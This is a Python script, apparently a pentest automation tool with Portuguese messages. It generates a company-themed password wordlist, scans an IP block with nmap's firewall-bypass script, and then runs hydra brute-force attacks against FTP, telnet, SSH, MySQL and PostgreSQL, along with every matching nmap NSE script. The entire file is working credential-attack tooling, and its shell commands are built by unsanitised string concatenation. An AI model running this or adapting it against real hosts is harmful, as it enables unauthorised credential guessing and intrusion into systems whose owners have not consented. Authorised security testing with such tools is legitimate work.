#!/usr/bin/env python3

#Passar nome do blocoip e IP/CIDR

import xml.etree.ElementTree as ET
import sys
import datetime
import requests
import subprocess
import os
import shutil
import uuid
import json
import string
from time import strftime

table1 = str.maketrans('aioO', '@100')
table2 = str.maketrans('aeioOs', '43100$')
table3 = str.maketrans('aeiou', 'AEIOU')
table4 = str.maketrans('IilLsS', '1111$$')
list_tables = [table1, table2, table3, table4]

dic = {}
blocoip = sys.argv[1]
company = sys.argv[2]


wordlistuser = open('wordlistuser.txt', 'w')
wordlistuser.write('admin'+'\n')
wordlistuser.write('administrator'+'\n')
wordlistuser.write('root'+'\n')
wordlistuser.write('msfadmin'+'\n')
wordlistuser.close()

def nse_function(ip,port,nse_script):
    
    subprocess.check_output('sudo nmap -sSV -Pn -T5 -p'+port+' --script='+nse_script+' '+ip+' -oX '+ip+'_'+nse_script+'.xml || true', shell=True)

def parse_xml(ip,nse_script):
    arquivo = ip+'_'+nse_script+'.xml'
    tree = ET.parse(arquivo)
    root = tree.getroot()
    for i in root.iter('nmaprun'):
        for j in i:
            for host in j:
                if(host.tag == 'ports'):
                    for port in host:
                        for script in port:
                            if(script.tag == 'script'):
                                print("\033[33m"+"   >> Resultado NSE: "+script.attrib['output']+"\033[0;0m")

def brute_force(ip,service):

    if(service == 'ssh'):
        subprocess.check_output('sudo hydra -f -L wordlistuser.txt -P wordlist.txt '+ip+' '+service+' -t 3 -b json -o '+ip+'_hydra_'+service+'.json || true', shell=True)
    else:
        subprocess.check_output('sudo hydra -f -L wordlistuser.txt -P wordlist.txt '+ip+' '+service+' -b json -o '+ip+'_hydra_'+service+'.json || true', shell=True)
    print("\033[33m"+"    >> Brute Force concluido."+"\033[0;0m")

def create_wordlist(company_name):

    wordlist = open('wordlist.txt', 'w')
    with open('wordlistuser.txt') as file:
        for line in file:
            line = line.rstrip('\n')
            for table in list_tables:
                wordlist.write(line)
                wordlist.write(line.translate(table)+'\n')
                wordlist.write((line.translate(table)+'\n').upper())
                wordlist.write((line.translate(table)+'\n').lower())
                wordlist.write((line.translate(table)+'\n').capitalize())
                wordlist.write((line.translate(table)+'\n').title())
                wordlist.write((line.translate(table)+'\n').swapcase())
                wordlist.write(line+company_name)
                wordlist.write((line+company_name.translate(table)+'\n'))
                wordlist.write((line+company_name.translate(table)+'\n').lower())
                wordlist.write((line+company_name.translate(table)+'\n').upper())
                wordlist.write((line+company_name.translate(table)+'\n').capitalize())
                wordlist.write((line+company_name.translate(table)+'\n').title())
                wordlist.write((line+company_name.translate(table)+'\n').swapcase())
                wordlist.write(company_name+line)
                wordlist.write(company_name+line.translate(table)+'\n')
                wordlist.write((company_name+line.translate(table)+'\n').upper())
                wordlist.write((company_name+line.translate(table)+'\n').lower())
                wordlist.write((company_name+line.translate(table)+'\n').capitalize())
                wordlist.write((company_name+line.translate(table)+'\n').title())
                wordlist.write((company_name+line.translate(table)+'\n').swapcase())
    wordlist.close()

def main():

    print("[+] Criando Wordlist \n")
    create_wordlist(company)

    print("[+] Executando o NMAP no endereco "+blocoip)
    subprocess.check_output('sudo nmap -sSV -Pn -T5 --script=/usr/share/nmap/scripts/firewall-bypass.nse '+blocoip+' -oX nmap.xml|| true', shell=True)
    tree = ET.parse('nmap.xml')
    root = tree.getroot()
    
    #Parse do XML    
    for i in root.iter('nmaprun'):
        for j in i:
            for host in j:
                if(host.tag == 'address'):
                    if(':' not in host.attrib['addr']):
                        dic['ip'] = host.attrib['addr']
                        dic['serveraddress'] = host.attrib['addr']
                        dic['tipo'] = host.attrib['addrtype']
                        print('\033[32m'+'\n#### '+dic['ip']+' ####'+'\033[0;0m'+'\n')
                if(host.tag == 'ports'):
                    for port in host:
                        if(port.tag == 'port'):
                            dic['porta'] = port.attrib['portid']
                            if(dic['porta'] == '21'):
                                print("<> Brute Force FTP")
                                brute_force(dic['ip'],'ftp')
                                for nse in os.listdir('/usr/share/nmap/scripts'):
                                    if('ftp' in nse):
                                        print("<> Executando o NSE: "+nse)
                                        nse_function(dic['ip'],'21',nse.rstrip('\n'))
                                        parse_xml(dic['ip'],nse.rstrip('\n'))
                            if(dic['porta'] == '23'):
                                print("<> Brute Force TELNET")
                                brute_force(dic['ip'],'telnet')
                                for nse in os.listdir('/usr/share/nmap/scripts'):    
                                    if('telnet' in nse):
                                        print("<> Executando o NSE: "+nse)
                                        nse_function(dic['ip'],'23',nse.rstrip('\n'))
                                        parse_xml(dic['ip'],nse.rstrip('\n'))
                            if(dic['porta'] == '22'):
                                print("<> Brute Force SSH")
                                brute_force(dic['ip'],'ssh')
                                for nse in os.listdir('/usr/share/nmap/scripts'): 
                                    if('ssh' in nse):
                                        print("<> Executando o NSE: "+nse)
                                        nse_function(dic['ip'],'22',nse.rstrip('\n'))
                                        parse_xml(dic['ip'],nse.rstrip('\n'))
                            if(dic['porta'] == '445'):
                                for nse in os.listdir('/usr/share/nmap/scripts'): 
                                    if('smb' in nse):
                                        print("<> Executando o NSE: "+nse)
                                        nse_function(dic['ip'],'445',nse.rstrip('\n'))
                                        parse_xml(dic['ip'],nse.rstrip('\n'))
                            if(dic['porta'] == '5060'):
                                for nse in os.listdir('/usr/share/nmap/scripts'): 
                                    if('sip' in nse):
                                        print("<> Executando o NSE: "+nse)
                                        nse_function(dic['ip'],'5060',nse.rstrip('\n'))
                                        parse_xml(dic['ip'],nse.rstrip('\n'))
                            if(dic['porta'] == '161'):
                                for nse in os.listdir('/usr/share/nmap/scripts'): 
                                    if('snmp' in nse):
                                        print("<> Executando o NSE: "+nse)
                                        nse_function(dic['ip'],'161',nse.rstrip('\n'))
                                        parse_xml(dic['ip'],nse.rstrip('\n'))
                            if(dic['porta'] == '162'):
                                for nse in os.listdir('/usr/share/nmap/scripts'): 
                                    if('snmp' in nse):
                                        print("<> Executando o NSE: "+nse)
                                        nse_function(dic['ip'],'162',nse.rstrip('\n'))
                                        parse_xml(dic['ip'],nse.rstrip('\n'))
                            if(dic['porta'] == '53'):
                                for nse in os.listdir('/usr/share/nmap/scripts'): 
                                    if('dns' in nse):
                                        print("<> Executando o NSE: "+nse)
                                        nse_function(dic['ip'],'53',nse.rstrip('\n'))
                                        parse_xml(dic['ip'],nse.rstrip('\n'))
                            if(dic['porta'] == '3306'):
                                print("<> Brute Force MYSQL")
                                brute_force(dic['ip'],'mysql')
                                for nse in os.listdir('/usr/share/nmap/scripts'): 
                                    if('mysql' in nse):
                                        print("<> Executando o NSE: "+nse)
                                        nse_function(dic['ip'],'3306',nse.rstrip('\n'))
                                        parse_xml(dic['ip'],nse.rstrip('\n'))
                            if(dic['porta'] == '5432'):
                                print("<> Brute Force Postgresql")
                                brute_force(dic['ip'],'postgres')
                                for nse in os.listdir('/usr/share/nmap/scripts'): 
                                    if('pgsql' in nse):
                                        print("<> Executando o NSE: "+nse)
                                        nse_function(dic['ip'],'5432',nse.rstrip('\n'))
                                        parse_xml(dic['ip'],nse.rstrip('\n'))
if __name__ == '__main__':
    main()
